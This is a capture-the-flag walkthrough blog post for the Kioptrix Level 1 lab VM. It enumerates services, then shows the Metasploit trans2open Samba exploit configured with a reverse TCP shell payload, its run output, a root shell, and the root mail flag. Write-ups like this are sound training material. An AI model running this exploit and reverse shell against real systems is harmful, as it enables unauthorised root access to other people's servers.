---
layout: blog_item
title:  "Kioptrix Level 1 Walkthrough"
date:   2013-12-19 14:00:10
author: Arr0way
description: 'Kioptrix Level 1 Walkthrough, CTF solution for Kioptrix Level 1.'
categories: [walkthroughs]
tags:
- Kioptrix
---

<div class="coffee-rating">
<table>
      <tbody>
        <tr>
           <td>
               <p><code>Coffee Difficulty Rating:</code></p>
           </td>
           <td>
               <p><i class="fa fa-coffee"></i></p>
           </td>
        </tr>
      </tbody>
</table>
</div>

* list element with functor item
{:toc}

## Author Description

The object of the game is to acquire root access via any means possible (except actually hacking the VM server or player). The purpose of these games are to learn the basic tools and techniques in vulnerability assessment and exploitation. There are more ways then one to successfully complete the challenges.

## Service Enumeration

<div class="mobile-side-scroller">
<table>
  <thead>
    <tr>
      <th>Port</th>
      <th>Service</th>
      <th>Version Detection</th>
    </tr>
  </thead>
      <tbody>
        <tr>
           <td>
               <pc><p><code>TCP: 22</code></p></pc>
           </td>
           <td>
               <pc><p>SSH</p></pc>
           </td>
           <td>
               <pc><p>OpenSSH 2.9p2 (protocol 1.99)</p></pc>
           </td>
        </tr>
        <tr>
           <td>
               <pc><p><code>TCP: 80</code></p></pc>
           </td>
           <td>
              <pc><p>HTTP</p></pc>
           </td>
           <td>
               <pc><p>Apache httpd 1.3.20 ((Unix)</p></pc>
           </td>
        </tr>

        <tr>
           <td>
               <pc><p><code>TCP: 111</code></p></pc>
           </td>
           <td>
              <pc><p>RPC Bind</p></pc>
           </td>
           <td>
               <pc><p>N/A</p></pc>
           </td>
        </tr>

        <tr>
           <td>
               <pc><p><code>TCP: 139</code></p></pc>
           </td>
           <td>
              <pc><p>netbios-ssn</p></pc>
           </td>
           <td>
               <pc><p>Samba</p></pc>
           </td>
        </tr>

        <tr>
           <td>
               <pc><p><code>TCP: 443</code></p></pc>
           </td>
           <td>
              <pc><p>HTTPS</p></pc>
           </td>
           <td>
               <pc><p>Apache httpd 1.3.20 ((Unix)</p></pc>
           </td>
        </tr>

      </tbody>

</table>
</div>


## Samba Enumeration

Based on the age of the system other services, I know from exeperience that SAMBA is likely vulnerable to the trans2open exploit.


{% highlight bash %}


use exploit/linux/samba/trans2open

msf exploit(trans2open) > show options

Module options (exploit/linux/samba/trans2open):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   RHOST  192.168.221.156  yes       The target address
   RPORT  139              yes       The target port


Payload options (generic/shell_reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  192.168.221.139  yes       The listen address
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Samba 2.2.x - Bruteforce


{% endhighlight %}


## Metasploit Exploit

{% highlight bash %}
msf exploit(trans2open) > run

[*] [2015.12.20-21:05:39] Started reverse handler on 192.168.221.139:4444
[*] [2015.12.20-21:05:40] Trying return address 0xbffffdfc...
[*] [2015.12.20-21:05:41] Trying return address 0xbffffcfc...
[*] [2015.12.20-21:05:42] Trying return address 0xbffffbfc...
[*] [2015.12.20-21:05:43] Trying return address 0xbffffafc...
[*] Command shell session 1 opened (192.168.221.139:4444 -> 192.168.221.156:1025) at 2015-12-20 21:05:44 -0500


^Z
Background session 1? [y/N]  N

id
uid=0(root) gid=0(root) groups=99(nobody)
hostname
kioptrix.level1
^Z
Background session 1? [y/N]  y
{% endhighlight %}


## Root Flag


Root Flag

{% highlight bash %}
sh-2.05# cd /var/spool/mail
cd /var/spool/mail
sh-2.05# ls
ls
harold
john
nfsnobody
root
sh-2.05# cat root   
cat root
From root  Sat Sep 26 11:42:10 2009
Return-Path: <root@kioptix.level1>
Received: (from root@localhost)
    by kioptix.level1 (8.11.6/8.11.6) id n8QFgAZ01831
    for root@kioptix.level1; Sat, 26 Sep 2009 11:42:10 -0400
Date: Sat, 26 Sep 2009 11:42:10 -0400
From: root <root@kioptix.level1>
Message-Id: <200909261542.n8QFgAZ01831@kioptix.level1>
To: root@kioptix.level1
Subject: About Level 2
Status: O

If you are reading this, you got root. Congratulations.
Level 2 won't be as easy...
{% endhighlight %}
